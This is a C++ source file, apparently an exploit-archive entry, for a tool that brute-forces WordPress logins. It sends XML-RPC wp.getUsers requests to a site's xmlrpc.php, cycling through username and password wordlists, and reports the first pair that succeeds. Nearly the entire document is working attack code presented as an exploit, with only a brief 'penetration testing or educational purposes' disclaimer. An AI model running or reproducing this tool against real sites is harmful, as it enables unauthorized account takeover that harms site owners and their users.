/**
 * Exploit Title: Brute force wordpress websites with xmlrpc enabled
 * Date: August 6, 2020
 * Vendor Homepage: https://wordpress.org/
 * Author: Xblackey
 * Version: 1.2.0
 * License: MIT
 */
#include <iostream>
#include <fstream>
#include <string.h>
#include <curl/curl.h>

#define PROGRAM "wpxbruteforce"
#define VERSION "1.2.0"
#define AUTHOR "Xblackey"

#define XMLRPC_PATH "/xmlrpc.php"

size_t write_to_string(void *ptr, size_t size, size_t count, void *stream)
{
    ((std::string *)stream)->append((char *)ptr, 0, size * count);
    return size * count;
}

int main(int argc, char **argv)
{
    std::cout << PROGRAM << " " << VERSION << " (c) 2022 by " << AUTHOR
              << " - Disclaimer: For penetration testing or "
                 "educational purposes only\n\n";

    std::string url_input = argv[1];

    while (url_input.back() == (char)'/')
    {
        url_input.pop_back();
    }

    url_input += XMLRPC_PATH;

    const char *url = url_input.c_str();

    const char *usersFilePath = argv[2];
    std::fstream users_file;
    users_file.open(usersFilePath, std::ios::in);

    const char *pwFilePath = argv[3];
    std::fstream passwords_file;
    passwords_file.open(pwFilePath, std::ios::in);

    if (!users_file)
    {
        std::cout << "Error open this file: " << usersFilePath << std::endl;
    }
    else if (!passwords_file)
    {
        std::cout << "Error open this file: " << pwFilePath << std::endl;
    }
    else
    {
        CURL *curl;
        CURLcode res;

        std::string post_str;
        std::string post1 = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
                            "<methodCall><methodName>wp.getUsers</methodName>"
                            "<params><param><value>1</value></param>"
                            "<param><value>";
        std::string username;
        std::string post2 = "</value></param><param><value>";
        std::string password;
        std::string post3 = "</value></param></params></methodCall>";

        curl = curl_easy_init();

        if (curl)
        {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_to_string);
            unsigned int count = 0;
            bool found = false;
            const char *check_fail = "faultString";
            const char *fail_code = "403";

            while (!users_file.eof() && found == false)
            {
                count = 0;
                getline(users_file, username);
                passwords_file.seekg(0, passwords_file.beg);
                char *username_c = new char[username.length() + 1];
                strcpy(username_c, username.c_str());

                while (!passwords_file.eof())
                {
                    std::string response;
                    ++count;
                    getline(passwords_file, password);

                    post_str = post1 + username + post2 + password + post3;

                    char *post = new char[post_str.length() + 1];
                    strcpy(post, post_str.c_str());

                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

                    res = curl_easy_perform(curl);

                    if (res == CURLE_OK)
                    {
                        char *res_str = new char[response.length() + 1];
                        strcpy(res_str, response.c_str());

                        if (res_str != "" && strstr(res_str, check_fail) && strstr(res_str, fail_code))
                        {
                            std::cout << "\r\e[K" << std::flush;
                            std::cout << "\r" << count << " - Trying: " << username << " - " << password << std::flush;
                        }
                        else if (strstr(res_str, username_c))
                        {
                            std::cout << std::endl
                                      << res_str << std::endl;
                            std::cout << count << " - FOUND: " << username << " - " << password << std::endl;
                            found = true;
                            break;
                        }
                        else
                        {
                            std::cout << std::endl
                                      << res_str << std::endl;
                            std::cout << "Result: ERROR" << std::endl;
                            std::cout << "--" << std::endl;
                            std::cout << "Hint: Check the inputs again" << std::endl;
                            found = true;
                            break;
                        }
                    }
                    else
                    {
                        std::cout << "curl_easy_perform() failed: " << stderr << std::endl;
                        found = true;
                        break;
                    }
                }
            }

            if (!found)
            {
                std::cout << "Result: NOT FOUND" << std::endl;
            }
        }
        else
        {
            std::cout << "Result: ERROR !curl" << std::endl;
        }
        curl_easy_cleanup(curl);
    }

    users_file.close();
    passwords_file.close();

    return 0;
}